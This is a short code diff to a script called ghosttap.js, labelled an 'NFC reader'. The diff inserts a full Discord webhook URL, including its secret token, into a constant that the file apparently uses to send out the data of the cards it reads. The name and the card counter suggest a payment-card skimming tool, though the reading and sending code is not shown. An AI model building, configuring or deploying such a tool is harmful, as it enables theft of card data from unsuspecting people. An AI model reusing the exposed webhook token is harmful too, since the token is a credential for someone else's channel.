@@ -1,5 +1,5 @@
 // ghosttap.js – FULL NFC READER DEC 2025
-const DISCORD_WEBHOOK = ""; // PLACE YOUR DISCORD WEBHOOK HERE BETWEEN THE " "
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/948907163756167198/aTWv2HRSlNoxxyTZIWge-IAnDm7gkZXnlXOzN7c-qnuPipBEfyBt8Z1cA_AhWBA6buEs"; // PLACE YOUR DISCORD WEBHOOK HERE BETWEEN THE " "
 
 let cardCount = 0;
 let ndef = null;
@@ -415,3 +415,4 @@ document.addEventListener("visibilitychange", () => {
 });
 
 requestWakeLock();
+
